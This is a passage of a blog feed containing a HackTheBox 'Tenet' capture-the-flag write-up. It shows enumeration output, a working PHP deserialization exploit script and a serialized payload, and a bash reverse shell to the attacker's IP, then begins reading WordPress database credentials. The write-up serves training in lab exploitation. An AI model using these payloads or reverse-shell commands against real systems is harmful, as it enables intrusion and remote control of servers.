 <li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Tenet</title>
+      <link>https://fahmifj.github.io/hackthebox/tenet/</link>
+      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/tenet/</guid>
+      <description>Friendly PHP insecure deserialization attack and race condition</description>
+      <content:encoded><![CDATA[<p>Tenet from Hack The Box hosts a Website that is vulnerable to PHP deserialization, and this can be exploited for initial access. Enumerating inside the system reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>PHP deserialization attack</li>
+<li>Race-condition</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Gobuster</li>
+<li>PHP</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.10.223 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ nmap -sC -sV -p<span class="nv">$ports</span> -oA scans/full-tenet 10.10.10.223
+<span class="c1"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
+Nmap scan report <span class="k">for</span> 10.10.10.223
+Host is up <span class="o">(</span>0.059s latency<span class="o">)</span>.
+Scanned at 2021-03-16 23:32:46 EDT <span class="k">for</span> 17s
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
+<span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span class="o">=</span>
+<span class="p">|</span>   <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
+<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="c1"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p><code>nmap</code> already identified that this site is the default page of Apache web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.223/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,bak
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/06/14 06:08:53 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918<span class="o">]</span>
+/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7<span class="o">]</span>    
+/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.223/wordpress/<span class="o">]</span>
+                                                                                    
+<span class="o">===============================================================</span>
+2021/06/14 06:11:20 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><p>Poking <code>/users.txt</code> returns a &ldquo;Success&rdquo; message.</p>
+<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
+</p>
+<h4 id="wordpress">/wordpress</h4>
+<p>On  <code>/wordpress</code>, somehow  the site looks broken.</p>
+<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
+</p>
+<p>It turns out there is a hostname.</p>
+<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
+</p>
+<p>I&rsquo;ll add <code>tenet.htb</code> to my <code>/etc/hosts</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ <span class="nb">echo</span> <span class="s1">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Poking the site with <code>curl</code> shows that this port has a slightly different contents when it visited using a hostname.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223 <span class="p">|</span> wc -c
+<span class="m">10918</span>
+→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://tenet.htb <span class="p">|</span> wc -c 
+<span class="m">10581</span>
+</code></pre></div><h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
+<p>On <code>tenet.htb</code>, there are some blog posts.</p>
+<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
+</p>
+<p>One of the post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
+<blockquote>
+<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
+</blockquote>
+<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
+</p>
+<p>At the bottom, there is a comment by a user named <code>neil</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
+</p>
+<p>The user was asking about a PHP file called sator and its backup file. I&rsquo;ll note this.</p>
+<h4 id="wpscan">WPScan</h4>
+<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\
+</span><span class="se"></span>            <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+             <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+...&lt;SNIP&gt;...
+<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+<span class="o">]</span> protagonist
+ <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
+ <span class="p">|</span> Confirmed By:
+ <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ <span class="p">|</span>   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
+ <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+<span class="o">]</span> neil
+ <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
+<p>I tried to guess the location of sator php files with <code>curl</code> but nothing there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://tenet.htb/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+HTTP/1.1 <span class="m">404</span> Not Found
+Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:50 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+
+HTTP/1.1 <span class="m">404</span> Not Found
+Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:51 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+</code></pre></div><h3 id="vhost-enumeration">Vhost Enumeration</h3>
+<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ cewl -m <span class="m">5</span> -w wordlist-vhost http://tenet.htb
+CeWL 5.4.6 <span class="o">(</span>Exclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
+</code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span class="s2">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span class="m">200</span> -fl <span class="m">376</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+
+       v1.3.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223
+ :: Wordlist         : FUZZ: wordlist-vhost
+ :: Header           : Host: FUZZ.tenet.htb
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>
+ :: Filter           : Response lines: <span class="m">376</span>
+________________________________________________
+
+:: Progress: <span class="o">[</span>93/93<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">11</span> req/sec :: Duration: <span class="o">[</span>0:00:05<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
+<p>The files that user Neil talking about was found at  <code>http://10.10.10.223/[here]</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://10.10.10.223/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+HTTP/1.1 <span class="m">200</span> OK
+Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:04 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+HTTP/1.1 <span class="m">200</span> OK
+Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:05 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Last-Modified: Thu, <span class="m">17</span> Dec <span class="m">2020</span> 09:52:50 GMT
+ETag: <span class="s2">&#34;202-5b6a5f47911e4&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span class="m">514</span>
+Content-Type: application/x-trash
+</code></pre></div><p>Another guessing, here the keyword is &ldquo;Migration&rdquo;, so I think that before they moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
+<p>Poking <code>Sator.php</code> results the following contents:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223/sator.php
+<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
+<span class="o">[]</span> Database updated &lt;br&gt;
+</code></pre></div><p>Poking <code>sator.php.bak</code> returns PHP codes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223/sator.php.bak
+&lt;?php
+
+class DatabaseExport
+<span class="o">{</span>
+        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
+        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+        public <span class="k">function</span> update_db<span class="o">()</span>
+        <span class="o">{</span>
+                <span class="nb">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
+                <span class="nv">$this</span>-&gt; <span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
+        <span class="o">}</span>
+
+
+        public <span class="k">function</span> __destruct<span class="o">()</span>
+        <span class="o">{</span>
+                file_put_contents<span class="o">(</span>__DIR__ . <span class="s1">&#39;/&#39;</span> . <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
+                <span class="nb">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
+        //      <span class="nb">echo</span> <span class="s1">&#39;Gotta get this working properly...&#39;</span><span class="p">;</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;arepo&#39;</span><span class="o">]</span> ?? <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
+<span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
+
+
+?&gt;
+</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
+<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span> 
+<span class="c1">// __destruct is called afterwards
+</span><span class="c1">// [] Database updated will be printed out
+</span></code></pre></div><p>Here is an example:</p>
+<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
+</p>
+<p>Furthermore, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="insecure-deserialization-attack---poc">Insecure Deserialization attack - PoC</h4>
+<p>From the previous code, <code>unserialize</code> is called before the creation of object (<code>$app</code>), so I will use the opposite magic function called <code>__construct()</code>.</p>
+<p>I&rsquo;ll do some testing with this script below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I will save the script to a file called <code>tenetization.php</code>.</p>
+<p>I will run that script and copy the output. If I don&rsquo;t have PHP, I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ php tenetization.php
+O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
+</code></pre></div><p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ curl -sI <span class="s2">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
+HTTP/1.1 <span class="m">200</span> OK
+Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 12:43:43 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div><p>When I visit <code>10.10.10.223/test.php</code>, it returns the PHP info page, which means I have a code execution.</p>
+<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
+</p>
+<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+		<span class="k">public</span> <span class="nx">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
+		<span class="k">public</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><h4 id="insecure-deserialization-attack---weaponize">Insecure Deserialization attack - Weaponize</h4>
+<p>This time, I&rsquo;ll modify the file name and the data for reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;iamf.php&#39;</span><span class="p">;</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php system(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span class="se">\&#34;</span><span class="s2">) ?&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>I&rsquo;ll script the exploitation step and then wait on my listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+<span class="nv">serial</span><span class="o">=</span><span class="sb">`</span>php tenetization.php<span class="sb">`</span>
+curl -s http://10.10.10.223/sator.php?arepo<span class="o">=</span><span class="nv">$serial</span>
+sleep 5<span class="p">;</span>
+curl -s http://10.10.10.223/iamf.php
+</code></pre></div><p>When I run the exploit, it hangs.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ bash tenetization.sh
+<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
+<span class="o">[]</span> Database updated &lt;br&gt;<span class="o">[]</span> Database updated &lt;br&gt;
+</code></pre></div><p>But after a few seconds, I have a shell on my listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
+$ nc -nvlp <span class="m">443</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223<span class="o">]</span> <span class="m">39174</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1545<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@tenet:/var/www/html$ id
+id
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@tenet:/var/www/html$
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-neil">Shell as neil</h3>
+<h4 id="wp-config">WP config</h4>
+<p>Inside the <code>wp-config.php</code> file, there is a database credential.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
+cat wp-config.php
+&lt;?php
+
+...&lt;SNIP&gt;...
+define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database username */
+define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;neil&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database password */
